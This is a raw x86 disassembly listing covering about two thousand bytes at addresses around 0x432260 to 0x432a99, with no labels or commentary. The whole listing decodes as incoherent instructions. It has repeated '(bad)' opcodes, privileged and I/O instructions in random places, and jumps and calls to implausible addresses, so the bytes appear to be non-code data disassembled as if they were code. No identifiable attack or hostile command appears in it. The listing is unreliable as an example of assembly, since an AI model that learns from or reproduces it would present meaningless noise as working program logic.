  43225e:	or     al,0xda
  432260:	push   eax
  432261:	(bad)  
  432262:	jne    0x432218
  432264:	call   0x3b1b53
  432269:	inc    ebp
  43226a:	sar    BYTE PTR [eax],0x84
  43226d:	in     al,dx
  43226e:	add    bh,al
  432270:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  432277:	(bad)  
  432278:	and    al,al
  43227a:	fs in  eax,dx
  43227c:	inc    DWORD PTR [ebp-0x7b]
  43227f:	jle    0x432290
  432281:	leave  
  432282:	scas   al,BYTE PTR es:[edi]
  432283:	inc    esp
  432284:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43228b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432292:	call   DWORD PTR [edi]
  432294:	shr    ah,0x84
  432297:	xchg   DWORD PTR [eax],eax
  432299:	add    DWORD PTR [eax],eax
  43229b:	add    bh,bh
  43229d:	dec    ebp
  43229e:	and    BYTE PTR [ecx-0x38],dl
  4322a1:	push   eax
  4322a2:	dec    DWORD PTR [ebx+0xfd885]
  4322a8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4322ae:	mov    WORD PTR [ecx+0x0],ss
  4322b1:	lea    ecx,[ebx+0x108b20d8]
  4322b7:	mov    WORD PTR [edx],ds
  4322b9:	add    BYTE PTR [edi+0xff01ff],al
  4322bf:	mov    ecx,DWORD PTR [ebp-0x28]
  4322c2:	push   ecx
  4322c3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4322c7:	inc    ebp
  4322c8:	in     al,0xeb
  4322ca:	jno    0x432257
  4322cc:	push   edx
  4322cd:	mov    DWORD PTR [eax-0x28],edx
  4322d0:	mov    eax,DWORD PTR [ebp+0x20]
  4322d3:	je     0x43225c
  4322d5:	mov    eax,DWORD PTR [ecx]
  4322d7:	sbb    BYTE PTR [eax],al
  4322d9:	pop    DWORD PTR [eax]
  4322db:	add    esi,eax
  4322dd:	add    bl,al
  4322df:	adc    DWORD PTR [edi],esi
  4322e1:	jmp    0x8bce7333
  4322e6:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4322ed:	jne    0x43227a
  4322ef:	mov    ecx,DWORD PTR [eax]
  4322f1:	in     al,0x75
  4322f3:	pop    DWORD PTR [ecx+0x5401]
  4322f9:	push   edx
  4322fa:	inc    DWORD PTR [ebx]
  4322fc:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432302:	add    BYTE PTR [edi+0x9],dl
  432305:	call   DWORD PTR [esi]
  432307:	and    dl,al
  432309:	and    bh,bh
  43230b:	inc    edi
  43230d:	test   eax,edx
  43230f:	sldt   ebx
  432312:	xor    al,BYTE PTR [eax]
  432314:	pushf  
  432315:	(bad)  
  432316:	jmp    0x432324
  432318:	mov    eax,edi
  43231a:	or     al,0x75
  43231c:	inc    eax
  43231d:	call   0x431a25
  432322:	mov    eax,eax
  432324:	loopne 0x4322aa
  432326:	inc    ebp
  432327:	add    BYTE PTR [ebx+0x1451c00],cl
  43232d:	mov    eax,DWORD PTR [ebp+0x20]
  432330:	add    edi,ecx
  432332:	add    BYTE PTR [eax],ch
  432334:	cmp    edi,0x18
  432337:	test   DWORD PTR [ebp+0xf],esi
  43233a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432341:	jne    0x432345
  432343:	call   0xffa21e08
  432348:	leave  
  432349:	rcr    BYTE PTR [esp+eax*4],0x55
  43234d:	add    ah,ch
  43234f:	add    BYTE PTR [edi-0x48fef979],dh
  432355:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  43235c:	inc    esp
  43235d:	mov    ebx,DWORD PTR [eax]
  43235f:	fcom   st(2)
  432361:	add    BYTE PTR [edi],bl
  432363:	lea    ecx,[eax-0x18]
  432366:	(bad)  
  432367:	push   DWORD PTR [ecx]
  432369:	call   0xffb570cb
  43236e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432372:	fstp   DWORD PTR [esi+ebx*8]
  432375:	push   ebp
  432376:	pop    ebp
  432377:	mov    esi,DWORD PTR [edx-0x38]
  43237a:	add    DWORD PTR [eax],0x28
  43237d:	mov    edi,DWORD PTR [ebx]
  43237f:	xor    esi,DWORD PTR [edx+0x3]
  432382:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432386:	pop    ebp
  432387:	or     al,0x4
  432389:	inc    ecx
  43238a:	push   ebp
  43238b:	(bad)  
  43238c:	in     al,dx
  43238d:	or     ah,ch
  43238f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432390:	xbegin 0xffc89986
  432396:	clc    
  432397:	adc    al,0x45
  432399:	div    BYTE PTR [edx]
  43239b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4323a2:	test   DWORD PTR [ebx+0x666300f8],ebx
  4323a8:	add    BYTE PTR [ecx+0x66],dh
  4323ab:	add    eax,DWORD PTR [ebp+0x52]
  4323ae:	adc    eax,0xffffffa0
  4323b1:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  4323b7:	test   DWORD PTR [eax],eax
  4323b9:	clc    
  4323ba:	data16 or al,BYTE PTR [ebp+0x45]
  4323be:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4323c5:	rol    BYTE PTR [ebp+0x45],1
  4323c8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4323ce:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4323d4:	push   ebx
  4323d5:	add    BYTE PTR [eax+eax*1+0x51],dl
  4323d9:	jge    0x43240e
  4323db:	add    BYTE PTR [esi+0x4],dl
  4323de:	jne    0x432445
  4323e0:	mov    edx,0x457200
  4323e5:	jmp    0x4323a9
  4323e7:	xor    edi,DWORD PTR [ebx]
  4323e9:	pop    edi
  4323ea:	cvtdq2ps xmm7,xmm0
  4323ed:	ret    0x0
  4323f0:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4323f6:	xor    ecx,DWORD PTR [edi]
  4323f8:	add    eax,DWORD PTR [ecx+0x3b]
  4323fb:	push   ebx
  4323fc:	rdpmc  
  4323fe:	out    0x8d,al
  432400:	add    BYTE PTR [eax],cl
  432402:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432408:	ret    0x450c
  43240b:	sbb    al,0x8b
  43240d:	cmp    eax,esi
  43240f:	or     cl,al
  432411:	or     al,0xc2
  432413:	pop    eax
  432414:	inc    ebp
  432415:	add    ecx,DWORD PTR [edi]
  432417:	add    esi,DWORD PTR [ebp+0x39]
  43241a:	invd   
  43241c:	jge    0x432428
  43241e:	mov    eax,0x478ac0
  432423:	cli    
  432424:	xor    esp,ecx
  432426:	mov    ebx,0x5b8ac0
  43242b:	ret    0x33
  43242e:	mov    eax,0x833b8b
  432433:	sub    BYTE PTR [ebx],al
  432435:	inc    ebp
  432436:	xor    ax,di
  432439:	pushf  
  43243a:	inc    bh
  43243c:	mov    esp,esp
  43243e:	hlt    
  43243f:	test   DWORD PTR [ebp-0x8],esi
  432442:	mov    eax,DWORD PTR [ebp-0x14]
  432445:	xor    ecx,DWORD PTR [ebx-0x76478864]
  43244b:	dec    edi
  43244c:	or     BYTE PTR [eax],al
  43244e:	jne    0x4323d9
  432450:	mov    esi,esp
  432452:	call   0x77a9b017
  432457:	inc    ebp
  432458:	mov    DWORD PTR [eax+0x9b4f0c],edi
  43245e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432464:	add    BYTE PTR [esi+0x7d],ah
  432467:	inc    ebp
  432468:	mov    bx,WORD PTR [ebp+0x8]
  43246c:	add    DWORD PTR [ebp+0x54],0x30c008b
  432473:	inc    ebp
  432474:	mov    bx,di
  432477:	lock test BYTE PTR [ecx+0x7000801],bh
  43247e:	jge    0x432441
  432480:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432486:	cli    
  432487:	xor    bl,bh
  432489:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43248f:	test   BYTE PTR [eax],cl
  432491:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432498:	cmp    ebp,eax
  43249a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4324a1:	test   BYTE PTR [ebp+0x1],bh
  4324a4:	mov    ebx,0x458a00
  4324a9:	xor    esi,DWORD PTR [ebx]
  4324ab:	add    esp,DWORD PTR [esi-0x77]
  4324ae:	pop    ebp
  4324af:	loopne 0x432517
  4324b1:	inc    ebp
  4324b2:	clc    
  4324b3:	xor    edi,DWORD PTR [ebx]
  4324b5:	add    esi,DWORD PTR [edx-0x77]
  4324b8:	data16 fdivr QWORD PTR [ebp-0x49]
  4324bc:	mov    ebx,0xb78afc
  4324c1:	hlt    
  4324c2:	xor    edi,DWORD PTR [esi+eiz*2]
  4324c5:	add    BYTE PTR [ebp+0x66],bl
  4324c8:	data16 lock clc 
  4324cb:	cmp    al,0x3b
  4324cd:	add    BYTE PTR [edi+0x66],dh
  4324d0:	psubq  mm7,QWORD PTR [ebp+0x2]
  4324d4:	ltr    WORD PTR [ebp+0x66]
  4324d8:	add    esi,eax
  4324da:	add    di,WORD PTR [ebp+0x2b]
  4324de:	data16 data16 jge 0x43255f
  4324e2:	mov    ebx,0xe08a8b
  4324e7:	jge    0x43251c
  4324e9:	data16 data16 xor al,0x5d
  4324ed:	data16 data16 jne 0x4324e9
  4324f1:	mov    edi,DWORD PTR [ebx]
  4324f3:	fdiv   QWORD PTR [edx+0x7d]
  4324f6:	data16 data16 jge 0x43252e
  4324fa:	mov    ebx,0x758a66
  4324ff:	mov    esi,0x667233
  432504:	pop    ebp
  432505:	or     BYTE PTR [esi+0x0],ah
  432508:	clc    
  432509:	mov    edi,DWORD PTR [ebx]
  43250b:	lock ja 0x432499
  43250e:	(bad)  
  432510:	jge    0x432509
  432512:	invd   
  432514:	pop    ebp
  432515:	add    BYTE PTR [ebx],al
  432517:	(bad)  
  432518:	cmp    di,WORD PTR [ebp+0xf]
  43251c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432520:	mov    bx,WORD PTR [ebp-0x10]
  432524:	pop    bp
  432526:	fbstp  TBYTE PTR [ebx]
  432528:	test   DWORD PTR [ebx],eax
  43252a:	add    BYTE PTR [ebx],bh
  43252c:	add    BYTE PTR [esi+0x7d],ah
  43252f:	jge    0x4324bc
  432531:	data16 in al,dx
  432533:	pop    ebp
  432534:	stc    
  432535:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  43253c:	mov    edi,ebx
  43253e:	in     al,dx
  43253f:	test   BYTE PTR [ebp+0x0],bh
  432542:	mov    eax,DWORD PTR [eax]
  432544:	call   0xbd401ed4
  432549:	cmp    al,0x9b
  43254b:	add    BYTE PTR [edx],dh
  43254d:	mov    bx,di
  432550:	call   0x8b4ba2e0
  432555:	add    ebp,esp
  432557:	mov    bx,di
  43255a:	jnp    0x432582
  43255c:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  432562:	mov    eax,DWORD PTR [eax]
  432564:	call   0x7c3eb0cf
  432569:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  43256f:	data16 data16 fistp WORD PTR [ebp+0xe]
  432574:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  43257e:	fisttp WORD PTR [ecx-0x7401f77b]
  432584:	(bad)  
  432585:	cld    
  432586:	jne    0x4325c4
  432588:	xor    eax,DWORD PTR [eax]
  43258a:	mov    esp,DWORD PTR [esi-0x10]
  43258d:	sti    
  43258e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432595:	data16 adc bl,bh
  432598:	push   ebp
  432599:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  4325a0:	mov    WORD PTR [eax],es
  4325a2:	fwait
  4325a3:	data16 xor bh,bl
  4325a6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4325ac:	mov    esp,DWORD PTR [esi-0x14]
  4325af:	fisttp WORD PTR [ebx-0x3748a9f2]
  4325b5:	or     al,0x2b
  4325b7:	mov    bh,0xba
  4325b9:	hlt    
  4325ba:	mov    bh,bl
  4325bc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4325c2:	dec    esi
  4325c3:	or     al,0x0
  4325c5:	mov    edi,DWORD PTR [ebx]
  4325c7:	or     BYTE PTR [ebp+0x3b],dh
  4325ca:	mov    ecx,DWORD PTR [edi]
  4325cc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4325d2:	xor    al,0xd8
  4325d4:	pop    bp
  4325d6:	lock xor esi,DWORD PTR [ebx]
  4325d9:	lea    esp,[esi+0x1f]
  4325dc:	icebp  
  4325dd:	jb     0x4325e3
  4325df:	add    al,al
  4325e1:	jge    0x4325ef
  4325e3:	mov    eax,eax
  4325e5:	fsubr  st,st(3)
  4325e7:	pop    ebp
  4325e8:	mov    esi,DWORD PTR [ebx]
  4325ea:	in     al,0x8d
  4325ec:	rcr    DWORD PTR [edi],0xc2
  4325ef:	jb     0x43264f
  4325f1:	add    cl,cl
  4325f3:	jge    0x432601
  4325f5:	mov    edx,DWORD PTR [ebp-0x20]
  4325f8:	in     al,dx
  4325f9:	pop    ebp
  4325fa:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4325ff:	cmp    di,WORD PTR [ebp+0x0]
  432603:	mov    ebp,DWORD PTR [ebx]
  432605:	fdivr  QWORD PTR [esi+0x668a5d]
  43260b:	cmp    al,0x33
  43260d:	mov    si,0x4e7d
  432611:	mov    eax,DWORD PTR [eax]
  432613:	lock inc ebp
  432615:	mov    esi,DWORD PTR [eax]
  432617:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43261e:	clc    
  43261f:	(bad)  
  432620:	cmp    edi,DWORD PTR [ebx]
  432622:	je     0x432633
  432624:	push   ebx
  432625:	loopne 0x432636
  432627:	dec    ecx
  432629:	mov    esp,DWORD PTR [ebp-0x1c]
  43262c:	int    0xf1
  43262e:	mov    esi,0x703084d
  432633:	pcmpgtd mm6,mm1
  432636:	add    BYTE PTR [ebp+0x66],dh
  432639:	jmp    0x432606
  43263b:	mov    eax,DWORD PTR [ebx]
  43263d:	lock push ebp
  43263f:	ror    DWORD PTR [ebp-0x2972feb3],1
  432645:	or     bh,dl
  432647:	jb     0x432647
  432649:	add    BYTE PTR [ebx-0x1a7487b3],cl
  43264f:	loopne 0x432651
  432651:	jne    0x432655
  432653:	data16 add BYTE PTR [esi+eiz*2],dh
  432657:	mov    ecx,ebx
  432659:	data16 cmp al,0xf1
  43265c:	add    BYTE PTR [esi+eiz*2],bh
  43265f:	add    bl,cl
  432661:	retw   0xf2
  432665:	ret    0x66
  432668:	retf   
  432669:	enterw 0x4df1,0x19
  43266e:	pop    edi
  43266f:	jne    0x4325f2
  432671:	mov    esi,DWORD PTR [eax]
  432673:	call   0x77b7b214
  432678:	xor    ebp,DWORD PTR [ebx]
  43267a:	lea    esp,[esi+0x48]
  43267d:	repnz in eax,0x3b
  432680:	add    BYTE PTR [ebp-0x37],dh
  432683:	xor    edx,DWORD PTR [ebp-0x15]
  432686:	in     al,dx
  432687:	xor    edx,DWORD PTR [esi+0x40]
  43268a:	mov    DWORD PTR [edi],0x338545fc
  432690:	clc    
  432691:	add    esi,DWORD PTR [ecx]
  432693:	pop    edi
  432694:	pushf  
  432695:	pop    ebx
  432696:	call   0xff44265d
  43269b:	mov    edi,eax
  43269d:	push   ecx
  43269e:	pop    es
  43269f:	mov    edi,DWORD PTR [eax]
  4326a1:	push   esi
  4326a2:	inc    esi
  4326a3:	add    bh,BYTE PTR [esi+0x0]
  4326a6:	popa   
  4326a7:	data16 (bad) 
  4326a9:	into   
  4326aa:	gs cmp al,0xcd
  4326ad:	add    BYTE PTR [ecx+0x7ce0866],bh
  4326b3:	ret    0x66
  4326b6:	add    bh,al
  4326b8:	add    bh,ah
  4326ba:	add    BYTE PTR [ebp+0x31c3f866],al
  4326c0:	cmp    al,0x9c
  4326c2:	add    BYTE PTR [esi+0x66],ah
  4326c5:	into   
  4326c6:	ret    
  4326c7:	pop    ebp
  4326c8:	adc    BYTE PTR [edi+0x0],dl
  4326cb:	mov    bh,0x66
  4326cd:	mov    edi,0xff038dc3
  4326d2:	jne    0x432728
  4326d4:	lea    edx,[ecx+0x1]
  4326d7:	mov    ebx,0xd64ff1
  4326dc:	sar    DWORD PTR [ebx],1
  4326de:	test   BYTE PTR [ebp+0x36],dh
  4326e1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4326e5:	push   edi
  4326e6:	xor    BYTE PTR [ebx],0x38
  4326e9:	mov    esi,ebx
  4326eb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4326f1:	ss inc ebp
  4326f3:	fs pop ebx
  4326f5:	mov    ebx,0x9c3b30
  4326fa:	je     0x432727
  4326fc:	xor    edi,DWORD PTR [ebx+0x668a33]
  432702:	mov    WORD PTR [ebx],?
  432704:	ss mov ebx,0x8b4e64
  43270a:	pop    edi
  43270b:	cmp    ecx,ecx
  43270d:	jne    0x432764
  43270f:	mov    ebp,esp
  432711:	cld    
  432712:	push   esi
  432713:	pop    ebx
  432714:	inc    ebp
  432715:	stc    
  432716:	xor    BYTE PTR [ebp+0x9bef89c],al
  43271c:	test   esi,ecx
  43271e:	clc    
  43271f:	test   dl,dl
  432721:	cmp    bh,bh
  432723:	fs pop si
  432726:	or     bl,al
  432728:	add    cl,BYTE PTR [ebx+0x57665100]
  43272e:	retf   0x3c45
  432731:	xor    BYTE PTR [eax],al
  432733:	pushf  
  432734:	mov    si,0x85ca
  432738:	ret    0xf8
  43273b:	pop    ebx
  43273c:	dec    dx
  43273f:	mov    edx,DWORD PTR [edi-0x76]
  432742:	push   edi
  432743:	add    al,0xb7
  432745:	xor    al,0xba
  432747:	cmp    al,0x8d
  432749:	je     0x43274a
  43274b:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  43274f:	lea    edi,[ebx+0x544fff]
  432755:	push   ecx
  432756:	cmp    edx,DWORD PTR [ebx+0x75]
  432759:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  43275f:	add    BYTE PTR [ebx],dh
  432761:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  432767:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  43276e:	mov    ebx,0x3b3b00
  432773:	jne    0x4327a0
  432775:	mov    DWORD PTR [ebx+0x728afc],edi
  43277b:	xor    esi,DWORD PTR [ebx]
  43277d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432783:	push   edi
  432784:	cmp    esp,ebp
  432786:	jne    0x432788
  432788:	sbb    DWORD PTR [eax],0x8085c3fc
  43278e:	clc    
  43278f:	inc    esi
  432790:	pop    ebx
  432791:	sti    
  432792:	add    eax,0xeb8bc075
  432797:	cld    
  432798:	xor    edi,DWORD PTR ds:0xf8c3855e
  43279e:	mov    ecx,DWORD PTR [ecx+edx*2]
  4327a1:	rol    DWORD PTR [ebp-0x37],0xf
  4327a5:	mov    DWORD PTR [eax],ecx
  4327a7:	inc    edi
  4327a8:	(bad)  
  4327a9:	in     eax,0xfe
  4327ab:	add    bh,bh
  4327ad:	(bad)  
  4327ae:	mov    esi,0xc38a5e
  4327b3:	mov    esi,DWORD PTR [ebx]
  4327b5:	push   ecx
  4327b6:	mov    edi,0xfc4ec7
  4327bb:	test   DWORD PTR [ebp-0x8],edx
  4327be:	xor    di,ax
  4327c1:	pushf  
  4327c2:	sub    ebp,eax
  4327c4:	inc    ebp
  4327c5:	(bad)  
  4327c6:	sub    edi,edi
  4327c8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4327ce:	inc    ebp
  4327cf:	add    BYTE PTR [esi+0x2b],ah
  4327d2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4327d8:	cmp    al,0x33
  4327da:	mov    edi,DWORD PTR [edx+0xfe4e81]
  4327e0:	(bad)  
  4327e1:	cmp    esi,DWORD PTR [ebx]
  4327e3:	je     0x43279d
  4327e5:	push   ebx
  4327e6:	dec    esi
  4327e7:	str    ecx
  4327ea:	cmp    esp,DWORD PTR [ebp+0x75]
  4327ed:	int    0x33
  4327ef:	mov    edi,0x789085f
  4327f4:	mov    edx,DWORD PTR [eax]
  4327f6:	cld    
  4327f7:	add    cl,cl
  4327f9:	data16 add al,0xcb
  4327fc:	push   ebp
  4327fd:	add    ebp,esp
  4327ff:	jne    0x4327ed
  432801:	(bad)  
  432802:	mov    DWORD PTR [ecx],0xd685f7ec
  432808:	clc    
  432809:	xlat   BYTE PTR ds:[ebx]
  43280a:	inc    ebp
  43280b:	mov    esi,DWORD PTR [edx]
  43280d:	push   eax
  43280e:	pushf  
  43280f:	in     eax,0x8b
  432811:	add    ah,ch
  432813:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432817:	add    ax,0x72cb
  43281b:	cmp    al,0x0
  43281d:	add    BYTE PTR [ebp+0x66],al
  432820:	(bad)  
  432821:	retf   
  432822:	lock ret 0x85
  432826:	clc    
  432827:	inc    bp
  432829:	retf   
  43282a:	cmp    eax,0xc77d9cc8
  43282f:	xor    ah,bh
  432831:	pushf  
  432832:	test   DWORD PTR [edi-0x8],ebx
  432835:	je     0x43287c
  432837:	xor    esi,DWORD PTR ds:0x7020840
  43283d:	ror    BYTE PTR [ebp-0x37],0x8d
  432841:	push   ebp
  432842:	add    esp,ebp
  432844:	jb     0x4327d1
  432846:	add    BYTE PTR [eax],cl
  432848:	dec    ebp
  432849:	mov    bh,0x81
  43284b:	push   esi
  43284c:	push   esp
  43284d:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  432854:	xor    al,BYTE PTR [eax]
  432856:	mov    edx,DWORD PTR [edi+0x10]
  432859:	(bad)  
  43285a:	scas   eax,DWORD PTR es:[edi]
  43285b:	ret    0x3b
  43285e:	jns    0x3b442551
  432864:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  432868:	dec    ebp
  432869:	or     BYTE PTR [ebx],ch
  43286b:	ret    0x458b
  43286e:	lock jmp 0x432862
  432871:	mov    ecx,DWORD PTR [eax]
  432873:	or     BYTE PTR [edi],al
  432875:	mov    ecx,eax
  432877:	xor    DWORD PTR [edx+0x2],0x0
  43287b:	mov    bh,0xc1
  43287d:	adc    BYTE PTR [eax],dh
  43287f:	iret   
  432880:	inc    ebp
  432881:	mov    DWORD PTR [ebx],0x4dfff8c4
  432887:	inc    BYTE PTR [ebx]
  432889:	ret    0xf8
  43288c:	adc    DWORD PTR [esi+0x10],esp
  43288f:	clc    
  432890:	dec    ecx
  432891:	fisttp WORD PTR [ecx+0x456604c0]
  432897:	add    dh,BYTE PTR ds:0x75e0845
  43289d:	ret    0x4d
  4328a0:	lea    ecx,[ebx+0x18728301]
  4328a6:	add    BYTE PTR [ebp+0x45],al
  4328a9:	xor    ecx,ebp
  4328ab:	pushf  
  4328ac:	add    bh,al
  4328ae:	add    al,ch
  4328b0:	inc    ebp
  4328b1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4328b7:	xor    eax,0x781084d
  4328bc:	push   esp
  4328bd:	fwait
  4328be:	push   ecx
  4328bf:	xor    al,BYTE PTR [ecx+0x32f89b89]
  4328c5:	inc    ebp
  4328c6:	cmp    edi,DWORD PTR [ecx]
  4328c8:	jbe    0x432866
  4328ca:	mov    eax,edi
  4328cc:	or     ah,dh
  4328ce:	inc    ebp
  4328cf:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4328d5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4328db:	in     al,dx
  4328dc:	hlt    
  4328dd:	push   esp
  4328de:	push   esp
  4328df:	push   ecx
  4328e0:	push   ecx
  4328e1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4328e7:	fwait
  4328e8:	fwait
  4328e9:	xor    dh,BYTE PTR [edx]
  4328eb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4328f1:	or     BYTE PTR [ebp+0x7],al
  4328f4:	mov    eax,ecx
  4328f6:	clc    
  4328f7:	jb     0x4328ba
  4328f9:	add    BYTE PTR [ebp+0x55],cl
  4328fc:	or     DWORD PTR [edi],0xc251d154
  432902:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43290c:	mov    edi,eax
  43290e:	or     cl,al
  432910:	inc    ebp
  432911:	dec    ebp
  432912:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432918:	or     WORD PTR [ecx],0x899b
  43291d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  432923:	mov    edx,DWORD PTR [ecx+0x8]
  432926:	mov    eax,DWORD PTR [ebp-0x8]
  432929:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  432930:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  432936:	inc    ebp
  432937:	dec    eax
  432938:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  43293e:	add    edx,DWORD PTR [ecx-0x8]
  432941:	mov    ecx,DWORD PTR [ecx]
  432943:	clc    
  432944:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  43294b:	mov    ecx,ebp
  43294d:	clc    
  43294e:	(bad)  
  43294f:	popf   
  432950:	inc    DWORD PTR [eax]
  432952:	ret    0x8b
  432955:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43295b:	mov    edi,esp
  43295d:	hlt    
  43295e:	test   ecx,esi
  432960:	clc    
  432961:	or     BYTE PTR [ebp+0x7],al
  432964:	xor    al,cl
  432966:	pushf  
  432967:	jb     0x43299c
  432969:	add    BYTE PTR [eax-0x3f],al
  43296c:	inc    eax
  43296d:	daa    
  43296e:	inc    ebp
  43296f:	inc    ebp
  432970:	xor    eax,0x7f80803
  432975:	dec    ebp
  432976:	fwait
  432977:	add    esi,DWORD PTR [edx]
  432979:	clc    
  43297a:	cmp    DWORD PTR [ecx],ecx
  43297c:	or     al,0x8
  43297e:	add    al,BYTE PTR [ebp+0x2c]
  432981:	xor    eax,0x7350845
  432986:	or     BYTE PTR [ebp+0x7],cl
  432989:	lea    ebx,[ebx-0x748dcdff]
  43298f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432996:	mov    edx,DWORD PTR [eax]
  432998:	cld    
  432999:	dec    ebp
  43299a:	push   esp
  43299b:	sub    edx,DWORD PTR [ecx-0x75]
  43299e:	add    eax,0xf172fc
  4329a3:	or     BYTE PTR [ebp+0x7],cl
  4329a6:	add    eax,ecx
  4329a8:	or     al,0x72
  4329aa:	add    DWORD PTR [eax],eax
  4329ac:	mov    ebx,0x29c2c1
  4329b1:	inc    ebp
  4329b2:	mov    eax,DWORD PTR [ebx]
  4329b4:	cmp    eax,0x3004d1c
  4329ba:	xbegin 0x66c8b5b4
  4329c0:	clc    
  4329c1:	or     BYTE PTR [ebp+0x45],al
  4329c4:	xor    dh,BYTE PTR ds:0x78b089c
  4329ca:	adc    BYTE PTR [ebp+0x45],cl
  4329cd:	lea    eax,[ebp+0x33727501]
  4329d3:	add    cl,ch
  4329d5:	inc    ebp
  4329d6:	add    bl,ch
  4329d8:	add    BYTE PTR [ebx+0x45850845],cl
  4329de:	je     0x43296b
  4329e0:	push   ebx
  4329e1:	or     al,0x85
  4329e3:	dec    ebp
  4329e4:	std    
  4329e5:	mov    bh,bh
  4329e7:	mov    BYTE PTR [ebp-0x75],al
  4329ea:	mov    edi,eax
  4329ec:	or     al,0x89
  4329ee:	inc    ebp
  4329ef:	clc    
  4329f0:	mov    esp,esp
  4329f2:	hlt    
  4329f3:	call   DWORD PTR [edi-0x37]
  4329f6:	push   esp
  4329f7:	or     al,0x51
  4329f9:	push   ebp
  4329fa:	xor    ebp,esp
  4329fc:	mov    esi,0x457251
  432a01:	xor    esi,eax
  432a03:	pushf  
  432a04:	inc    ebp
  432a05:	(bad)  
  432a06:	mov    edi,eax
  432a08:	or     al,0x85
  432a0a:	add    al,bh
  432a0c:	inc    eax
  432a0e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a12:	or     ah,bh
  432a14:	inc    eax
  432a15:	push   esp
  432a16:	jmp    0x432a69
  432a18:	mov    eax,DWORD PTR ds:0xe8720c
  432a1e:	mov    DWORD PTR [ebp-0x8],eax
  432a21:	jne    0x432a68
  432a23:	jmp    0x4329b0
  432a25:	mov    ebp,DWORD PTR [eax]
  432a27:	clc    
  432a28:	retf   0xff54
  432a2b:	push   ecx
  432a2c:	mov    DWORD PTR ds:0x757210,eax
  432a32:	mov    ecx,DWORD PTR [ebp-0x4]
  432a35:	sub    esp,DWORD PTR [ebx-0x77]
  432a38:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432a3f:	or     ah,bh
  432a41:	pop    es
  432a42:	ds fwait
  432a44:	push   DWORD PTR [edx]
  432a46:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432a4c:	(bad)  
  432a4d:	mov    bh,bh
  432a4f:	jmp    0x432a3d
  432a51:	leave  
  432a52:	jne    0x432a5c
  432a54:	call   0x3023ae
  432a59:	in     al,dx
  432a5a:	dec    ebp
  432a5b:	add    dh,BYTE PTR [ebx]
  432a5d:	add    BYTE PTR [ebx],al
  432a5f:	inc    ebp
  432a60:	cmp    esi,DWORD PTR [ecx]
  432a62:	je     0x432a00
  432a64:	mov    eax,edi
  432a66:	or     al,0xf0
  432a68:	add    BYTE PTR [ebp+0x458bf845],al
  432a6e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432a74:	adc    al,0x7
  432a76:	enter  0x9fc0,0xa5
  432a7a:	rol    BYTE PTR [eax],0x5e
  432a7d:	mov    ecx,ecx
  432a7f:	or     al,0xc
  432a81:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a88:	jmp    0x432a89
  432a8a:	push   ebp
  432a8b:	mov    esp,ebp
  432a8d:	cld    
  432a8e:	inc    ebp
  432a8f:	inc    ebp
  432a90:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a97:	push   esi
  432a98:	push   esi
  432a99:	mov    edi,0x7af080f
